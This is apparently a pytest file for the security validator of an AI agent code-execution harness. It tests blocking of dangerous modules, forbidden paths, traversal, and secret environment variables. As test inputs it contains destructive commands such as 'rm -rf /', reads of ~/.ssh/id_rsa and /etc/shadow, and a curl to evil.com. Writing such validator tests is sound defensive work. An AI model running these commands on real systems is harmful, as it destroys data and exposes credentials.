"""Tests for validator.py: module/command/path validation and env sanitization."""

from __future__ import annotations

from pathlib import Path

from myrm_agent_harness.toolkits.code_execution.security.validator import (
    _extract_paths,
    _extract_url_hosts,
    _get_allowed_paths,
    _is_forbidden_path,
    _is_path_allowed,
    is_command_allowed,
    is_module_allowed,
    is_path_allowed,
    is_path_component_safe,
    validate_command,
    validate_module,
    validate_path,
    validate_path_component,
)

# ---------------------------------------------------------------------------
# _is_forbidden_path
# ---------------------------------------------------------------------------


class TestForbiddenPath:
    def test_ssh_dir(self) -> None:
        assert _is_forbidden_path("~/.ssh") is True

    def test_ssh_subpath(self) -> None:
        assert _is_forbidden_path("~/.ssh/id_rsa") is True

    def test_etc_shadow(self) -> None:
        assert _is_forbidden_path("/etc/shadow") is True

    def test_proc(self) -> None:
        assert _is_forbidden_path("/proc") is True

    def test_normal_path_allowed(self) -> None:
        assert _is_forbidden_path("/home/user/project") is False

    def test_tmp_allowed(self) -> None:
        assert _is_forbidden_path("/tmp/file.txt") is False


# ---------------------------------------------------------------------------
# validate_module
# ---------------------------------------------------------------------------


class TestValidateModule:
    def test_safe_module(self) -> None:
        result = validate_module("json")
        assert result.is_safe is True

    def test_dangerous_module_subprocess(self) -> None:
        result = validate_module("subprocess")
        assert result.is_safe is False
        assert result.blocked_item == "subprocess"

    def test_submodule_of_dangerous(self) -> None:
        result = validate_module("ctypes.util")
        assert result.is_safe is False
        assert result.blocked_item == "ctypes"

    def test_is_module_allowed_convenience(self) -> None:
        assert is_module_allowed("json") is True
        assert is_module_allowed("subprocess") is False


# ---------------------------------------------------------------------------
# _extract_paths
# ---------------------------------------------------------------------------


class TestExtractPaths:
    def test_absolute_path(self) -> None:
        paths = _extract_paths("cat /etc/hostname")
        assert any("/etc/hostname" in p for p in paths)

    def test_home_tilde(self) -> None:
        paths = _extract_paths("cat ~/notes.txt")
        assert any("~" in p for p in paths)

    def test_relative_dotdot(self) -> None:
        paths = _extract_paths("cat ../../secret.txt")
        assert any(".." in p for p in paths)

    def test_traversal_mid_path(self) -> None:
        paths = _extract_paths("rm -rf ./foo/../../../etc/passwd")
        assert any(".." in p for p in paths)

    def test_traversal_deep_mid_path(self) -> None:
        paths = _extract_paths("cat subdir/../../secret.txt")
        assert any(".." in p for p in paths)

    def test_no_paths(self) -> None:
        paths = _extract_paths("echo hello")
        assert paths == []


# ---------------------------------------------------------------------------
# _extract_url_hosts
# ---------------------------------------------------------------------------


class TestExtractUrlHosts:
    def test_http_url(self) -> None:
        hosts = _extract_url_hosts("curl http://example.com/api")
        assert "example.com" in hosts

    def test_https_url(self) -> None:
        hosts = _extract_url_hosts("curl https://api.github.com/repos")
        assert "api.github.com" in hosts

    def test_url_with_port(self) -> None:
        hosts = _extract_url_hosts("curl http://localhost:8080/health")
        assert "localhost" in hosts

    def test_url_with_auth(self) -> None:
        hosts = _extract_url_hosts("curl http://user:pass@example.com/api")
        assert "example.com" in hosts

    def test_no_urls(self) -> None:
        hosts = _extract_url_hosts("ls -la")
        assert hosts == []


# ---------------------------------------------------------------------------
# _get_allowed_paths / _is_path_allowed
# ---------------------------------------------------------------------------


class TestGetAllowedPaths:
    def test_default_includes_workspace_and_tmp(self) -> None:
        paths = _get_allowed_paths()
        path_strs = [str(p) for p in paths]
        assert any("workspace" in s for s in path_strs)
        assert any("tmp" in s for s in path_strs)

    def test_with_workspace(self) -> None:
        paths = _get_allowed_paths(workspace_path=Path("/home/user/project"))
        assert any("project" in str(p) for p in paths)

    def test_with_additional_paths(self) -> None:
        paths = _get_allowed_paths(additional_paths=[Path("/extra/dir")])
        assert any("extra" in str(p) for p in paths)


class TestIsPathAllowed:
    def test_relative_path_allowed(self) -> None:
        allowed = _get_allowed_paths()
        assert _is_path_allowed("file.txt", allowed) is True

    def test_forbidden_path_blocked(self) -> None:
        allowed = _get_allowed_paths()
        assert _is_path_allowed("~/.ssh/id_rsa", allowed) is False

    def test_tmp_path_allowed(self) -> None:
        allowed = _get_allowed_paths()
        assert _is_path_allowed("/tmp/data.csv", allowed) is True

    def test_outside_allowed_blocked(self) -> None:
        allowed = _get_allowed_paths(workspace_path=Path("/home/user/project"))
        assert _is_path_allowed("/opt/secret", allowed) is False

    def test_dotdot_in_path(self) -> None:
        allowed = _get_allowed_paths(workspace_path=Path("/home/user/project"))
        result = _is_path_allowed("../../../etc/passwd", allowed)
        assert isinstance(result, bool)


# ---------------------------------------------------------------------------
# validate_command
# ---------------------------------------------------------------------------


class TestValidateCommand:
    def test_safe_command(self) -> None:
        result = validate_command("ls -la")
        assert result.is_safe is True

    def test_dangerous_command_blocked(self) -> None:
        result = validate_command("rm -rf /")
        assert result.is_safe is False

    def test_forbidden_path_in_command(self) -> None:
        result = validate_command("cat ~/.ssh/id_rsa")
        assert result.is_safe is False

    def test_skip_path_check(self) -> None:
        result = validate_command("cat ~/.ssh/id_rsa", check_paths=False)
        assert result.is_safe is True

    def test_host_whitelist_allowed(self) -> None:
        result = validate_command(
            "curl https://api.github.com/repos",
            allowed_hosts=frozenset({"api.github.com"}),
        )
        assert result.is_safe is True

    def test_host_whitelist_blocked(self) -> None:
        result = validate_command(
            "curl https://evil.com/malware",
            allowed_hosts=frozenset({"api.github.com"}),
        )
        assert result.is_safe is False

    def test_no_host_whitelist_passes(self) -> None:
        result = validate_command("curl https://any.com/data")
        assert result.is_safe is True

    def test_is_command_allowed_convenience(self) -> None:
        assert is_command_allowed("ls") is True
        assert is_command_allowed("rm -rf /") is False


# ---------------------------------------------------------------------------
# validate_path
# ---------------------------------------------------------------------------


class TestValidatePath:
    def test_relative_path_safe(self) -> None:
        result = validate_path("file.txt")
        assert result.is_safe is True

    def test_forbidden_path_blocked(self) -> None:
        result = validate_path("~/.ssh/id_rsa")
        assert result.is_safe is False
        assert "forbidden" in (result.reason or "").lower()

    def test_tmp_path_allowed(self) -> None:
        result = validate_path(Path("/tmp/data.csv"))
        assert result.is_safe is True

    def test_outside_allowed_blocked(self) -> None:
        result = validate_path(
            "/opt/secret.txt",
            allowed_dirs=[Path("/home/user/project")],
        )
        assert result.is_safe is False

    def test_is_path_allowed_convenience(self) -> None:
        assert is_path_allowed("file.txt") is True


# ---------------------------------------------------------------------------
# validate_path_component
# ---------------------------------------------------------------------------


class TestValidatePathComponent:
    def test_valid_component(self) -> None:
        result = validate_path_component("user-123")
        assert result.is_safe is True

    def test_empty_component(self) -> None:
        result = validate_path_component("")
        assert result.is_safe is False

    def test_too_long(self) -> None:
        result = validate_path_component("a" * 256)
        assert result.is_safe is False

    def test_starts_with_dot(self) -> None:
        result = validate_path_component(".hidden")
        assert result.is_safe is False

    def test_contains_dotdot(self) -> None:
        result = validate_path_component("foo..bar")
        assert result.is_safe is False

    def test_contains_slash(self) -> None:
        result = validate_path_component("foo/bar")
        assert result.is_safe is False

    def test_contains_backslash(self) -> None:
        result = validate_path_component("foo\\bar")
        assert result.is_safe is False

    def test_special_chars(self) -> None:
        result = validate_path_component("foo@bar")
        assert result.is_safe is False

    def test_alphanumeric_hyphen_underscore(self) -> None:
        result = validate_path_component("valid_user-name123")
        assert result.is_safe is True

    def test_is_path_component_safe_convenience(self) -> None:
        assert is_path_component_safe("abc123") is True
        assert is_path_component_safe("") is False


# ---------------------------------------------------------------------------
# Edge cases for uncovered branches
# ---------------------------------------------------------------------------


class TestExtractUrlHostsEdge:
    def test_ipv6_url(self) -> None:
        hosts = _extract_url_hosts("curl http://[::1]:8080/api")
        assert "::1" in hosts

    def test_malformed_url_handled(self) -> None:
        hosts = _extract_url_hosts("curl http://")
        assert isinstance(hosts, list)


class TestIsPathAllowedEdge:
    def test_absolute_path_outside_allowed(self) -> None:
        allowed = _get_allowed_paths(workspace_path=Path("/home/user/project"))
        result = _is_path_allowed("/opt/secret/data.txt", allowed)
        assert result is False


class TestValidatePathEdge:
    def test_path_with_dotdot(self) -> None:
        result = validate_path("../../etc/shadow")
        assert isinstance(result.is_safe, bool)

    def test_path_object_input(self) -> None:
        result = validate_path(Path("local_file.txt"))
        assert result.is_safe is True


class TestValidateCommandEdge:
    def test_path_check_with_workspace(self) -> None:
        result = validate_command(
            "cat /tmp/safe.txt",
            workspace_path=Path("/tmp"),
            check_paths=True,
        )
        assert result.is_safe is True

    def test_empty_host_whitelist(self) -> None:
        result = validate_command(
            "curl https://any.com/data",
            allowed_hosts=frozenset(),
        )
        assert result.is_safe is False

    def test_url_with_no_hosts_extracted(self) -> None:
        result = validate_command(
            "echo hello",
            allowed_hosts=frozenset({"example.com"}),
        )
        assert result.is_safe is True


class TestValidatePathExceptionFallback:
    def test_unresolvable_path(self) -> None:
        from unittest.mock import patch

        with patch("pathlib.Path.resolve", side_effect=OSError("mock error")):
            result = validate_path(
                "/some/absolute/path.txt",
                allowed_dirs=[Path("/home")],
            )
            assert result.is_safe is False

    def test_url_parse_exception(self) -> None:
        from unittest.mock import patch

        with patch(
            "myrm_agent_harness.toolkits.code_execution.security.validator.urlparse",
            side_effect=ValueError("parse error"),
        ):
            hosts = _extract_url_hosts("curl http://example.com/api")
            assert hosts == []


class TestIsPathAllowedExceptionFallback:
    def test_path_resolve_generic_exception(self) -> None:
        from unittest.mock import patch

        allowed = _get_allowed_paths(workspace_path=Path("/home"))
        with patch("pathlib.Path.is_absolute", return_value=True):
            with patch("pathlib.Path.resolve", side_effect=RuntimeError("mock")):
                result = _is_path_allowed("/some/path", allowed)
                assert result is False


class TestExtractPathsBranch:
    def test_path_with_empty_match_skipped(self) -> None:
        paths = _extract_paths("echo /valid/path /another")
        assert all(p.strip() for p in paths)


class TestExtractUrlHostsBranch:
    def test_url_with_empty_netloc(self) -> None:
        hosts = _extract_url_hosts("curl http:///path")
        assert isinstance(hosts, list)

    def test_url_ipv6_bracket(self) -> None:
        hosts = _extract_url_hosts("curl http://[2001:db8::1]:8080/api")
        assert "2001:db8::1" in hosts

    def test_url_with_empty_host(self) -> None:
        """http://:8080/ has netloc=':8080' but host is empty — should be skipped."""
        hosts = _extract_url_hosts("curl http://:8080/api")
        assert hosts == []


class TestValidateCommandBranch:
    def test_command_with_escalate_only_passes(self) -> None:
        result = validate_command("eval something", check_paths=False)
        assert result.is_safe is True


# ---------------------------------------------------------------------------
# sanitize_env
# ---------------------------------------------------------------------------


class TestSanitizeEnv:
    def test_none_policy_returns_empty(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            sanitize_env,
        )

        result = sanitize_env({"PATH": "/usr/bin", "HOME": "/home/user"}, EnvInheritPolicy.NONE)
        assert result == {}

    def test_core_policy_keeps_only_core(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            sanitize_env,
        )

        env = {"PATH": "/usr/bin", "HOME": "/home/user", "MY_CUSTOM_VAR": "value"}
        result = sanitize_env(env, EnvInheritPolicy.CORE)
        assert "PATH" in result
        assert "HOME" in result
        assert "MY_CUSTOM_VAR" not in result

    def test_all_policy_filters_dangerous(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            sanitize_env,
        )

        env = {"PATH": "/usr/bin", "AWS_SECRET_ACCESS_KEY": "secret123"}
        result = sanitize_env(env, EnvInheritPolicy.ALL)
        assert "PATH" in result
        assert "AWS_SECRET_ACCESS_KEY" not in result

    def test_all_policy_filters_prefix_match(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            sanitize_env,
        )

        env = {"PATH": "/usr/bin", "GITHUB_TOKEN": "ghp_xyz"}
        result = sanitize_env(env, EnvInheritPolicy.ALL)
        assert "PATH" in result

    def test_all_policy_filters_wildcard_match(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            _matches_wildcard,
            sanitize_env,
        )

        assert _matches_wildcard("MY_API_KEY") is True
        assert _matches_wildcard("CUSTOM_SECRET") is True
        assert _matches_wildcard("SAFE_VARIABLE") is False

        env = {"SAFE_VAR": "ok", "MY_SECRET_TOKEN": "hidden"}
        result = sanitize_env(env, EnvInheritPolicy.ALL)
        assert "SAFE_VAR" in result
        assert "MY_SECRET_TOKEN" not in result

    def test_all_policy_safe_vars_pass(self) -> None:
        from myrm_agent_harness.toolkits.code_execution.security.validator import (
            EnvInheritPolicy,
            sanitize_env,
        )

        env = {"PATH": "/usr/bin", "HOME": "/home/user", "LANG": "en_US.UTF-8"}
        result = sanitize_env(env, EnvInheritPolicy.ALL)
        assert result == env
